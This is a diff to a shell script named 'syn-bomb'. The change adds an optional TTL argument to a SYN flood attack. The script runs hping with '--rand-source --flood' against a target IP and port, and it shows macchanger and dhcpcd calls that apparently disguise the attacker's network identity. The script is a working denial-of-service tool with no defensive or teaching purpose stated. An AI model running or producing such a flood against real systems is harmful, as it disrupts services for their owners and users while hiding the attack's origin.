@@ -2,8 +2,15 @@
 
 #Check if Parameters are set
 if [ "$3" = "" ]; then
-	echo "Use: syn-bomb TARGET_IP PORT INTERFACE"
-	exit
+  echo "Use: syn-bomb TARGET_IP PORT INTERFACE TTL"
+  echo "(TTL is optional, default=64)"
+  exit
+fi
+
+ttl=" "
+
+if [ "$4" != "" ]; then
+  ttl="-t $4"
 fi
 
 echo "Welcome to SYN Bomb!"
@@ -41,4 +48,4 @@ sudo macchanger -s $3 |grep Current
 sudo dhcpcd $3
 
 #SYN attack
-sudo hping -S -p $2 $1 --rand-source --flood -I $3
+sudo hping -S -p $2 $1 --rand-source --flood -I $3 $ttl
